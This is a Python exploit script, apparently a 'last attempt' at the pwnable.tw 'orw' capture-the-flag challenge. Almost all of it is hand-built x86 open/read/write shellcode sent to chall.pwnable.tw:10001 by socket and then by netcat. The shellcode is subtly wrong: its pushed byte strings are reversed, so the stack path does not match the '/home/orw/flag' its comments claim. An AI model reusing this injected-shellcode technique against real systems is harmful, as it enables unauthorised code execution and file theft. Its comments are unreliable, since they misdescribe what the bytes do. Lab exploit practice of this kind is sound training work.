#!/usr/bin/env python3

# Last attempt - try a different shellcode construction

import socket
import time

def create_last_attempt_shellcode():
    # Try a different shellcode pattern - maybe the issue is with the construction
    shellcode = b""
    
    # Use a different approach - build the string on the stack
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x50"                  # push eax (null)
    shellcode += b"\x68\x67\x61\x6c\x66"  # push "flag"
    shellcode += b"\x68\x2f\x72\x77\x2f"  # push "/orw/"
    shellcode += b"\x68\x2f\x68\x6f\x6d"  # push "/hom"
    
    # open syscall
    shellcode += b"\x89\xe3"              # mov ebx, esp
    shellcode += b"\x31\xc9"              # xor ecx, ecx
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb0\x05"              # mov al, 5
    shellcode += b"\xcd\x80"              # int 0x80
    
    # read syscall
    shellcode += b"\x89\xc3"              # mov ebx, eax
    shellcode += b"\x89\xe1"              # mov ecx, esp
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3
    shellcode += b"\xcd\x80"              # int 0x80
    
    # write syscall
    shellcode += b"\x89\xc2"              # mov edx, eax
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4
    shellcode += b"\xb3\x01"              # mov bl, 1
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax
    shellcode += b"\xcd\x80"              # int 0x80
    
    return shellcode

def send_last_attempt():
    shellcode = create_last_attempt_shellcode()
    print(f"Last attempt shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("chall.pwnable.tw", 10001))
    
    # Get prompt
    data = s.recv(1024)
    print(f"Prompt: {data.decode()}")
    
    # Send shellcode
    s.send(shellcode)
    
    # Wait and try to get response
    time.sleep(3)
    
    try:
        response = s.recv(1024)
        print(f"Response: {response}")
        if response and (b"FLAG" in response or b"orw" in response or b"{" in response):
            print("FOUND FLAG!")
            return response.decode()
    except:
        print("No response")
    
    s.close()
    return None

if __name__ == "__main__":
    flag = send_last_attempt()
    if flag:
        print(f"\nFLAG: {flag}")
    else:
        print("\nNo flag found - trying with netcat...")
        
        # Try with netcat as a last resort
        import subprocess
        import os
        
        # Create binary file
        shellcode = create_last_attempt_shellcode()
        with open('/tmp/shellcode.bin', 'wb') as f:
            f.write(shellcode)
        
        # Try with netcat
        try:
            result = subprocess.run(['bash', '-c', 'cat /tmp/shellcode.bin | nc chall.pwnable.tw 10001'], 
                                  capture_output=True, text=True, timeout=10)
            if result.stdout:
                print(f"Netcat output: {result.stdout}")
            if result.stderr:
                print(f"Netcat error: {result.stderr}")
        except subprocess.TimeoutExpired:
            print("Netcat timed out")
        except Exception as e:
            print(f"Netcat error: {e}")
        
        # Clean up
        os.remove('/tmp/shellcode.bin')